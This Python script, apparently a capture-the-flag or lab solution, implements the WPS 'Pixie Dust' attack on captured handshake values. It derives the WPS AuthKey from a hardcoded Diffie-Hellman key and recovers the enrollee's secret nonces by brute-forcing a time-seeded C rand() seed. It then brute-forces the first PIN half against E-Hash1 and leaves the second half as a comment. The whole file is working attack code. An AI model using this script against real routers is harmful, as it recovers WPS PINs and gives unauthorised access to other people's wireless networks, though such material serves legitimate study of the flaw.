import hashlib
import hmac
from datetime import datetime, timezone

# ---------- Inputs ----------
p = int("FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"
        "29024E088A67CC74020BBEA63B139B22514A08798E3404DD"
        "EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245"
        "E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED"
        "EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3D"
        "C2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F"
        "83655D23DCA3AD961C62F356208552BB9ED529077096966D"
        "670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF", 16)

PKE = bytes.fromhex("224854c2a0615b0ec6a5313e13a237b94bdda79857e035ed369e353bdec085c7"
                    "0042555cf75266e95e5bb22394471189a464fe5aa2e10ca42b647415023514024d"
                    "11adb22e4ee00f08b446de7af030ea59abbad95f510a83d0ef9aa58121e72d457c"
                    "d6096371b451f7eee4c368c5d3c6e2352b9680b4801ec8c1b2681f8d9df12ad631"
                    "1e200d23db49bcb8c17a3a83986a8e09225877120de2f8d1271810b447e5583836"
                    "031450325907e73d9bbfdd00d05872b2be6ad0a0d047bbc28c0e33d5")
PKR = bytes.fromhex("f63d33037ceeec960f31a949a1180e034668d38bb93ee13f91d7032690ae6b62"
                    "e477fd13c0d448cbe3bba2cc64b843ef67034773e812fac8955c6b0196cbadbdd"
                    "e36a2e45e97a7b2f21c1a76a939d91be0da59e9ab3bce50064d14dddc8b22bd90"
                    "b248439ddd905aed7afe530237d89faf94ef3ec885c5fee228e11b860bda735bd"
                    "6042ecb10ee80e31aa2e3bb0f4c8df26de0fe1a88dfa86be6fa9af51761541658"
                    "5688733e947b07c181acc02adc3fb409e50ec7c6b11f0bc2b6f59eadf60c")
privR = int("f14310ea480d86979562093f7a32324c5aa1fe4b333ec1ad6c3126c7275fde25"
            "f0b1628bb2521b4bd8fd6837df29577c527514e0eac2c85ec6953a60f85fc491"
            "6cbfcdac57fb6cc9061a9f4ac9de0718b4ec6b0cb065b4458d0e45852957d48f"
            "596269ea61dd20e61c14a1dd82e3446397a2af7711502ebee5d04587b186ce51"
            "a960451d5ac5aaa4bb42bce1dac9a43d3737858e2cb4cb6b50ade2fb34f71081"
            "5fb91fbb091739f6181b7c53d737c4ac27ca0b98e4f22c2f88ef9f9421aa88db", 16)

N1  = bytes.fromhex("13c6fa78d61c5f8fb08bbe82de2ec5e1")   # Enrollee Nonce
N2  = bytes.fromhex("4a7ad98d501ac2f14e8b1503ee7765f9")   # Registrar Nonce
MAC = bytes.fromhex("50c7bf3e91a4")                       # Enrollee MAC

EHASH1 = bytes.fromhex("9ec639fd84ec2c9859abdb630ea6444cf32dc6c598ae0916c9fe8e857348e808")
EHASH2 = bytes.fromhex("a741a38d8f7540822bed717b0e5921545339cef7efe020bda780043e48fd5c51")

# ---------- Phase 1: AuthKey ----------
shared = pow(int.from_bytes(PKE, "big"), privR, p).to_bytes(192, "big")
DHKey  = hashlib.sha256(shared).digest()
KDK    = hmac.new(DHKey, N1 + MAC + N2, hashlib.sha256).digest()

def kdf(key, total_bits):
    personal = b"Wi-Fi Easy and Secure Key Derivation"
    out = b""
    i = 1
    while len(out) * 8 < total_bits:
        out += hmac.new(key, i.to_bytes(4, "big") + personal + total_bits.to_bytes(4, "big"),
                        hashlib.sha256).digest()
        i += 1
    return out[:total_bits // 8]

AuthKey = kdf(KDK, 640)[:32]

# ---------- Phase 2: recover E-S1 / E-S2 from the seeded PRNG ----------
def stream(seed, n):          # ANSI C rand()
    out = []
    for _ in range(n):
        seed = (seed * 1103515245 + 12345) % 2**31
        out.append((seed >> 16) & 0xff)
    return bytes(out)

# Seed is Unix-time based: center the search on the first packet's capture time
# (from the pcap) and confirm the candidate by reproducing N1.
CAPTURE_TIME = int(datetime(2025, 1, 9, 20, 58, 58, tzinfo=timezone.utc).timestamp())
WINDOW = 1800
seed = next(s for s in range(CAPTURE_TIME - WINDOW, CAPTURE_TIME + WINDOW)
            if stream(s, 16) == N1)
buf = stream(seed, 64)
ES1, ES2 = buf[32:48], buf[48:64]

# ---------- Phase 3: brute the PIN ----------

# Creates the HMAC-SHA256 of this message under this key, as raw bytes
def H(key, msg):
    return hmac.new(key, msg, hashlib.sha256).digest()
#
def psk(half):
    return H(AuthKey, half.encode())[:16]

# Building the E-Hash
def ehash(nonce, half):
    return H(AuthKey, nonce + psk(half) + PKE + PKR)

# Brute-force the 1st half (4 digits) against E-Hash1, then repeat for the
# 2nd half (3 digits + checksum) against E-Hash2, and reassemble the PIN.
first_half = None
for n in range(10000):
    guess = f"{n:04d}"
    if ehash(ES1, guess) == EHASH1:
        first_half = guess       # matched the first PIN half
        break

if first_half is None:
    print("no match - encoding is probably wrong")
else:
    print("first half recovered")   # value intentionally not printed
    # Repeat the same approach against EHASH2 with ES2 for the second half.
